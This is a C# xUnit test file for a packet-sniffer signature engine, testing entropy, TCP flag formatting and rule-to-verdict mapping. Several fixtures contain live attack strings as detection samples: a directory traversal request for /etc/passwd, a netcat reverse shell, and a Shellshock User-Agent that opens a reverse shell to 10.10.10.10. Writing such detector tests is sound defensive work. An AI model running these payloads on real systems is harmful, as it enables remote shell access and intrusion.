using System.Linq;
using System.Text;
using PacketDotNet;
using PacketSniffer.Core;
using Xunit;

namespace PacketSniffer.Tests;

public class SignatureEngineTests
{
    // ---- ShannonEntropy -----------------------------------------------------------------------

    [Fact]
    public void ShannonEntropy_AllIdenticalBytes_IsZero()
    {
        byte[] data = new byte[100]; // all zeros
        Assert.Equal(0.0, SignatureEngine.ShannonEntropy(data));
    }

    [Fact]
    public void ShannonEntropy_FourDistinctEqualBytes_IsTwo()
    {
        byte[] data = { 1, 2, 3, 4 };
        Assert.Equal(2.0, SignatureEngine.ShannonEntropy(data), 10);
    }

    [Fact]
    public void ShannonEntropy_Empty_IsZero()
    {
        Assert.Equal(0.0, SignatureEngine.ShannonEntropy(System.ReadOnlySpan<byte>.Empty));
    }

    // ---- ContainsExploitStrings ---------------------------------------------------------------

    [Fact]
    public void ContainsExploitStrings_DirectoryTraversal_IsTrue()
    {
        var payload = Encoding.ASCII.GetBytes("GET ../../../etc/passwd HTTP/1.1");
        Assert.True(SignatureEngine.ContainsExploitStrings(payload));
    }

    [Fact]
    public void ContainsExploitStrings_BenignWebTraffic_IsFalse()
    {
        var payload = Encoding.ASCII.GetBytes("GET /index.html HTTP/1.1");
        Assert.False(SignatureEngine.ContainsExploitStrings(payload));
    }

    [Fact]
    public void ContainsExploitStrings_ReverseShell_IsTrue()
    {
        var payload = Encoding.ASCII.GetBytes("nc -e /bin/bash 10.0.0.1 4444");
        Assert.True(SignatureEngine.ContainsExploitStrings(payload));
    }

    [Fact]
    public void ContainsExploitStrings_Empty_IsFalse()
    {
        Assert.False(SignatureEngine.ContainsExploitStrings(System.ReadOnlySpan<byte>.Empty));
    }

    // ---- FormatTcpFlags -----------------------------------------------------------------------

    [Fact]
    public void FormatTcpFlags_NoFlags_IsNone()
    {
        var eth = PacketFactory.BuildTcp("10.0.0.1", "10.0.0.2", 1000, 80, flags: 0x00);
        var tcp = eth.Extract<TcpPacket>();
        Assert.Equal("NONE", SignatureEngine.FormatTcpFlags(tcp));
    }

    [Fact]
    public void FormatTcpFlags_SynAck_ContainsSynAndAck()
    {
        var eth = PacketFactory.BuildTcp("10.0.0.1", "10.0.0.2", 1000, 80, flags: 0x02 | 0x10);
        var tcp = eth.Extract<TcpPacket>();
        var formatted = SignatureEngine.FormatTcpFlags(tcp);
        Assert.Contains("SYN", formatted);
        Assert.Contains("ACK", formatted);
    }

    // ---- Inspect: verdict mapping -------------------------------------------------------------

    [Fact]
    public void Inspect_CleanWebTraffic_IsBenign()
    {
        // Port 80, ACK, distinct ports, no payload, distinct src/dst.
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50000, 80, flags: 0x10);
        var matches = SignatureEngine.Inspect(eth);

        // No matches, or only Informational => Benign.
        Assert.Equal(Verdict.Benign, VerdictMapping.VerdictOf(matches));
    }

    [Fact]
    public void Inspect_LandAttack_ProducesPs2003AndMalicious()
    {
        // Source == destination. Use distinct ports so we isolate the LAND rule cleanly.
        var eth = PacketFactory.BuildTcp("10.0.0.5", "10.0.0.5", 50000, 80, flags: 0x10);
        var matches = SignatureEngine.Inspect(eth);

        Assert.Contains(matches, m => m.Sid == "PS-2003");
        Assert.Equal(Verdict.Malicious, VerdictMapping.VerdictOf(matches));
    }

    [Fact]
    public void Inspect_SynFin_ProducesPs3003()
    {
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50001, 443, flags: 0x02 | 0x01);
        var matches = SignatureEngine.Inspect(eth);
        Assert.Contains(matches, m => m.Sid == "PS-3003");
    }

    [Fact]
    public void Inspect_NullFlags_ProducesPs3002()
    {
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50001, 443, flags: 0x00);
        var matches = SignatureEngine.Inspect(eth);
        Assert.Contains(matches, m => m.Sid == "PS-3002");
    }

    [Fact]
    public void Inspect_ExploitStringInTcpPayload_ProducesPs4001AndMalicious()
    {
        var payload = Encoding.ASCII.GetBytes(
            "GET / HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c 'nc -e /bin/bash 10.10.10.10 4444'");
        var eth = PacketFactory.BuildTcp("10.10.10.10", "192.168.1.20", 5555, 80, flags: 0x10, payload: payload);
        var matches = SignatureEngine.Inspect(eth);

        Assert.Contains(matches, m => m.Sid == "PS-4001");
        Assert.Equal(Verdict.Malicious, VerdictMapping.VerdictOf(matches));
    }

    [Fact]
    public void Inspect_BroadcastSourceMac_ProducesPs1001AndMalicious()
    {
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50000, 80, flags: 0x10);
        eth.SourceHardwareAddress = System.Net.NetworkInformation.PhysicalAddress.Parse("FFFFFFFFFFFF");
        eth.UpdateCalculatedValues();

        var matches = SignatureEngine.Inspect(eth);
        Assert.Contains(matches, m => m.Sid == "PS-1001");
        Assert.Equal(Verdict.Malicious, VerdictMapping.VerdictOf(matches));
    }

    // ---- Inspect: entropy gating --------------------------------------------------------------

    [Fact]
    public void Inspect_ShortHighEntropyPayloadOnPort80_DoesNotProducePs4002()
    {
        // 32 bytes: below the 64-byte minimum, so the entropy rule must not fire.
        var payload = PacketFactory.HighEntropyBytes(32);
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50000, 80, flags: 0x10, payload: payload);
        var matches = SignatureEngine.Inspect(eth);

        Assert.DoesNotContain(matches, m => m.Sid == "PS-4002");
    }

    [Fact]
    public void Inspect_LongHighEntropyPayloadOnPort80_ProducesPs4002()
    {
        // 256 bytes of 0..255 => entropy = 8.0 bits/byte, > 7.5 threshold, length >= 64.
        var payload = PacketFactory.HighEntropyBytes(256);
        var eth = PacketFactory.BuildTcp("192.168.1.10", "8.8.8.8", 50000, 80, flags: 0x10, payload: payload);
        var matches = SignatureEngine.Inspect(eth);

        Assert.Contains(matches, m => m.Sid == "PS-4002");
    }

    [Fact]
    public void Inspect_Null_ReturnsEmpty()
    {
        Assert.Empty(SignatureEngine.Inspect(null!));
    }
}
